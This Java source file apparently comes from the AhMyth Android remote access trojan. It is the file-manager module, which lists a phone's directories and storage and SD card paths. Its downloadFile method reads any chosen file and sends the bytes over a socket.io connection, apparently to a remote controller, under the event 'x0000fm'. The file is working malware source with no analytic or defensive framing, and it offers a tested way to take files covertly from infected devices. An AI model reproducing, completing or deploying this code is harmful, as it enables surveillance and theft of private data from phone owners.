package ahmyth.mine.king.ahmyth;

import android.content.Context;
import android.os.Build;
import android.os.Environment;
import android.support.v4.content.ContextCompat;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;

public class FileManager {

    public static JSONArray walk(String path) {
        // Read all files sorted into the values-array
        JSONArray values = new JSONArray();
        File dir = new File(path);
        if (!dir.canRead()) {
            Log.d("cannot","inaccessible");
        }

        File[] list = dir.listFiles();
        try {
            if (list != null) {
                JSONObject parentObj = new JSONObject();
                parentObj.put("name", "../");
                parentObj.put("isDir", true);
                parentObj.put("path", dir.getParent());
                values.put(parentObj);
                for (File file : list) {
                    if (!file.getName().startsWith(".")) {
                        JSONObject fileObj = new JSONObject();
                        fileObj.put("name", file.getName());
                        fileObj.put("isDir", file.isDirectory());
                        fileObj.put("path", file.getAbsolutePath());
                        values.put(fileObj);
                    }
                }
            }
        } catch (JSONException e) {
            e.printStackTrace();
        }

        return values;
    }

    public static void downloadFile(String path) {
        if (path == null)
            return;

        File file = new File(path);

        if (file.exists()) {
            int size = (int) file.length();
            byte[] data = new byte[size];
            try {
                BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
                buf.read(data, 0, data.length);
                JSONObject object = new JSONObject();
                object.put("file", true);
                object.put("name", file.getName());
                object.put("buffer", data);
                IOSocket.getInstance().getIoSocket().emit("x0000fm", object);
                buf.close();
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
    }

    // method to get external storage path
    public static String getExternalStoragePath() {
        return Environment.getExternalStorageDirectory().getAbsolutePath();
    }

    // method to get removable storage path
    public static String getSDCardPath(Context context) {
        String sdCardPath = null;

        // Check for SD card path for SDK 19 and above
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            File[] externalDirs = ContextCompat.getExternalFilesDirs(context, null);
            for (File dir : externalDirs) {
                if (dir != null) {
                    // For SDK 21 and above
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                        if (Environment.isExternalStorageRemovable(dir)) {
                            sdCardPath = dir.getAbsolutePath();
                            // Remove application-specific directory part
                            sdCardPath = sdCardPath.replace("/Android/data/" + context.getPackageName() + "/files", "");
                            break;
                        }
                    } else {
                        // For SDK 19 and 20: Use heuristics to infer removability
                        String dirPath = dir.getAbsolutePath();
                        if (!dirPath.equals(getExternalStoragePath())) {
                            // Assume paths other than primary storage are removable
                            sdCardPath = dirPath;
                            // Remove application-specific directory part
                            sdCardPath = sdCardPath.replace("/Android/data/" + context.getPackageName() + "/files", "");
                            break;
                        }
                    }
                }
            }
        }

        // Check for SD card path for SDK 16 to 20
        if (sdCardPath == null) {
            String secondaryStorage = System.getenv("SECONDARY_STORAGE");
            if (secondaryStorage != null && !secondaryStorage.isEmpty()) {
                // Handle multiple paths
                String[] paths = secondaryStorage.split(":");
                for (String path : paths) {
                    // Check if the path is not the primary external storage
                    if (!path.equals(getExternalStoragePath())) {
                        sdCardPath = path;
                        break;
                    }
                }
            } else {
                String externalStorage = System.getenv("EXTERNAL_STORAGE");
                if (externalStorage != null && !externalStorage.isEmpty()) {
                    // Check if the path is not the primary external storage
                    if (!externalStorage.equals(getExternalStoragePath())) {
                        sdCardPath = externalStorage;
                    }
                }
            }
        }

        return sdCardPath;
    }
}